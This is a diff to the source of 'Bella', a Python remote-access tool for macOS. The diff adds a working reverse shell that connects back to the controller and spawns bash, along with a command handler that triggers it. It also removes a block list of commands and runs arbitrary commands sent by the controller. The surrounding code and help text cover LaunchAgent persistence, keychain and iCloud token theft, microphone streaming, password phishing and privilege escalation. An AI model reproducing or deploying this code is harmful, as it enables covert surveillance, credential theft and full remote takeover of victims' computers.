@@ -2,26 +2,47 @@
 # -*- coding: utf-8 -*-
 import sys, socket, subprocess, time, os, platform, struct, getpass, datetime, plistlib, re, stat, grp, shutil
 import string, json, traceback, pwd, urllib, urllib2, base64, binascii, hashlib, sqlite3, bz2, pickle, ast
-import StringIO, zipfile, hmac, tempfile, ssl
+import StringIO, zipfile, hmac, tempfile, ssl, select
 from xml.etree import ElementTree as ET
 from subprocess import Popen, PIPE
 from glob import glob
 development = True
 def create_bella_helpers(launch_agent_name, bella_folder, home_path):
-	launch_agent_create = """<?xml version=\"1.0\" encoding=\"UTF-8\"?>
-	<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">
-	<plist version=\"1.0\">
-	<dict>
-		<key>Label</key>
-		<string>%s</string>
-		<key>ProgramArguments</key>
-		<array>
-			<string>%s/Library/%s/Bella</string>
-		</array>
-		<key>StartInterval</key>
-		<integer>5</integer>    
-	</dict>
-	</plist>\n""" % (launch_agent_name, home_path, bella_folder)
+	if development:
+		launch_agent_create = """<?xml version=\"1.0\" encoding=\"UTF-8\"?>
+		<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">
+		<plist version=\"1.0\">
+		<dict>
+			<key>Label</key>
+			<string>%s</string>
+			<key>ProgramArguments</key>
+			<array>
+				<string>%s/Library/%s/Bella</string>
+			</array>
+			<key>StandardErrorPath</key>
+			<string>%s/Library/%s/Bella.stderr.log</string>
+			<key>StandardOutPath</key>
+			<string>%s/Library/%s/Bella.stdout.log</string>
+			<key>StartInterval</key>
+			<integer>5</integer>    
+		</dict>
+		</plist>\n""" % (launch_agent_name, home_path, bella_folder, home_path, bella_folder, home_path, bella_folder)
+	else:
+		launch_agent_create = """<?xml version=\"1.0\" encoding=\"UTF-8\"?>
+		<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">
+		<plist version=\"1.0\">
+		<dict>
+			<key>Label</key>
+			<string>%s</string>
+			<key>ProgramArguments</key>
+			<array>
+				<string>%s/Library/%s/Bella</string>
+			</array>
+			<key>StartInterval</key>
+			<integer>5</integer>    
+		</dict>
+		</plist>\n""" % (launch_agent_name, home_path, bella_folder)
+
 	if not os.path.isdir('%s/Library/LaunchAgents/' % home_path):
 		os.makedirs('%s/Library/LaunchAgents/' % home_path)
 	with open('%s/Library/LaunchAgents/%s.plist' % (home_path, launch_agent_name), 'wb') as content:
@@ -983,6 +1004,7 @@ def manual():
 	value += "\n%siCloud Token%s\nPrompt the keychain to present the User's iCloud Authorization Token.\nUsage: %siCloud_token%s\nRequirements: None\n" % (underline + bold + light_blue, endANSI, bold, endANSI)
 	value += "\n%sInsomnia Load%s\nLoads an InsomniaX Kext to prevent laptop from sleeping, even when closed.\nUsage: %sinsomnia_load%s\nRequirements: root, laptops only\n" % (underline + bold + yellow, endANSI, bold, endANSI)
 	value += "\n%sInsomnia Unload%s\nUnloads an InsomniaX Kext loaded through insomnia_load.\nUsage: %sinsomnia_unload%s\nRequirements: root, laptops only\n" % (underline + bold + yellow, endANSI, bold, endANSI)
+	value += "\n%sInteractive Shell%s\nLoads an interactive reverse shell (bash) to the remote machine. This allows us to run commands such as telnet, nano, sudo, etc.\nUsage: %sinteractive_shell%s\n" % (underline + bold, endANSI, bold, endANSI)
 	value += "\n%sBella Info%s\nExtensively details information about the user and information from the Bella instance.\nUsage: %sbella_info%s\nRequirements: None\n" % (underline + bold + yellow, endANSI, bold, endANSI)
 	value += "\n%sKeychain Download%s\nDownloads all available Keychains, including iCloud, for offline processing.\nUsage: %skeychain_download%s\nRequirements: None\n" % (underline + bold + light_blue, endANSI, bold, endANSI)
 	value += "\n%sMike Stream%s\nStreams the microphone input over a socket.\nUsage: %smike_stream%s\nRequirements: None\n" % (underline + bold + light_blue, endANSI, bold, endANSI)
@@ -996,7 +1018,6 @@ def manual():
 	value += "\n%sShutdown Server%s\nUnloads Bella from launchctl until next reboot.\nUsage: %sshutdown_server%s\nRequirements: None.\n" % (underline + bold + yellow, endANSI, bold, endANSI)
 	value += "\n%sSystem Information%s\nReturns basic information about the system.\nUsage: %ssysinfo%s\nRequirements: None.\n" % (underline + bold + yellow, endANSI, bold, endANSI)
 	value += "\n%sUser Pass Phish%s\nWill phish the user for their password with a clever dialog.\nUsage: %suser_pass_phish%s\nRequirements: None.\n" % (underline + bold + yellow, endANSI, bold, endANSI)
-	#value += "\n%sInteractive Shell%s\nLoads an interactive reverse shell (bash) to the remote machine.\nUsage: %sinteractiveShell%s\n" % (underline + bold, endANSI, bold, endANSI)
 	#value += "\n%sKey Start%s\nBegin keylogging in the background.\nUsage: %skeyStart%s (requires root)\n" % (underline + bold, endANSI, bold, endANSI)
 	#value += "\n%sKey Kill%s\nStop keylogging started through Key Start\nUsage: %skeyStart%s (requires root)\n" % (underline + bold, endANSI, bold, endANSI)
 	#value += "\n%sKey Read%s\nReads the encrypted key log file from Key Start.\nUsage: %skeyRead%s (requires root)\n" % (underline + bold, endANSI, bold, endANSI)
@@ -1470,7 +1491,7 @@ def rooter(): #ROOTER MUST BE CALLED INDEPENDENTLY -- Equivalent to getsystem
 			send_msg('', True)
 			return
 	else:
-		send_msg("%sNo local user password found. This will give us system and can be phished.\n" % red_minus, False)
+		send_msg("%sNo user password found. Run 'phish_user_pass' to phish this. It should give us root.\n" % red_minus, False)
 
 	if sys_vers.startswith("10.8") or sys_vers.startswith("10.9") or sys_vers.startswith("10.10") or sys_vers == ("10.11") or sys_vers == ("10.11.1") or sys_vers == ("10.11.2") or sys_vers == ("10.11.3"):
 		zipped = readDB('mach_race', True)
@@ -1492,6 +1513,15 @@ def rooter(): #ROOTER MUST BE CALLED INDEPENDENTLY -- Equivalent to getsystem
 			return
 	send_msg("%sLocal privilege escalation not implemented for OSX %s\n" % (red_minus, sys_vers), True)
 	return
+
+def start_interactive_shell(shell_port):
+		shelled = subprocess.Popen("python -c \"import sys,socket,os,pty; _,ip,port=('', '%s', '%s'); s=socket.socket(); s.connect((ip,int(port))); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; pty.spawn('/bin/bash')\"" % (host, shell_port), shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE  )
+		time.sleep(1)
+		if shelled.poll():
+			send_msg("%sFailed to start interactive shell.\nError: [%s]\n" % (red_minus, shelled.stderr.read().replace('\n', '')), True)
+		else:
+			send_msg('interactive_shell_init', True)
+		return
 
 def tokenFactory(authCode):
 	#now that we have proper b64 encoded auth code, we will attempt to get all account tokens.
@@ -1984,6 +2014,10 @@ def bella(*Emma):
 					serialized = pickle.dumps(serial)
 					send_msg("6E87CF0B" + serialized, True)
 				
+				elif data.startswith('interactive_shell'):
+					interactive_shell_port = data.split(':::')[1]
+					start_interactive_shell(interactive_shell_port)
+
 				elif data.startswith('download'):
 					fileName = data[8:]
 					try:
@@ -2075,41 +2109,39 @@ def bella(*Emma):
 
 				else:
 					try:
-						blocking = False
-						blockers = ['sudo', 'nano', 'ftp', 'emacs', 'telnet', 'caffeinate', 'ssh'] #the best i can do for now ...
-						for x in blockers:
-							if x in data:
-								send_msg('%s[%s] is a blocking command. It will not run.\n' % (yellow_star, x), True)
-								blocking = True
-								break
-						if not blocking:
-							proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
-							####### MAKE THIS A GLOBAL RUNNER FUNCTION THAT WILL BE USED IN LIEU OF ALL CHECK_OUTPUTS #######
-							done = False
-							while proc.poll() == None:
-								bellaConnection.settimeout(0.0) #set socket to non-blocking (dont wait for data)
-								try: #SEE IF WE HAVE INCOMING MESSAGE MID LOOP
-									if recv_msg(bellaConnection) == 'sigint9kill':
-										sys.stdout.flush()
-										proc.terminate()
-										send_msg('terminated', True) #send back confirmation along with STDERR
-										done = True
-										bellaConnection.settimeout(None)
-										break
-								except socket.error as e: #no message, business as usual
-									pass
-								bellaConnection.settimeout(None)
-
+						proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
+						done = False
+						while proc.poll() == None:
+							bellaConnection.settimeout(0.0) #set socket to non-blocking (dont wait for data)
+							try: #SEE IF WE HAVE INCOMING MESSAGE MID LOOP
+								if recv_msg(bellaConnection) == 'sigint9kill':
+									sys.stdout.flush()
+									proc.terminate()
+									send_msg('terminated', True) #send back confirmation along with STDERR
+									done = True
+									bellaConnection.settimeout(None)
+									break
+							except socket.error as e: #no message, business as usual
+								pass
+							bellaConnection.settimeout(None)
+							out = select.select([proc.stdout.fileno()], [], [], 5)[0]
+							if out:
 								line = proc.stdout.readline()
 								if line != "":
 									send_msg(line, False)
 								else:
 									#at this point we are done with the loop, can get / send stderr
-									send_msg(line + proc.communicate()[1], True)
+									send_msg(line + proc.stderr.read(), True)
 									done = True
 									break
-							if not done:
-								send_msg(proc.stdout.read() + proc.stderr.read(), True)
+							else:
+								send_msg("%s[%s] is an interactive command.\n%sBella does not support interactive commands.\n%sUse 'interactive_shell' to perform this task.\n" % (blue_star, data, yellow_star, blue_star), True)
+								sys.stdout.flush()
+								#proc.terminate()
+								done = True
+								break
+						if not done:
+							send_msg(proc.stdout.read() + proc.stderr.read(), True)
 
 					except socket.error, e:
 						if e[0] == 32:
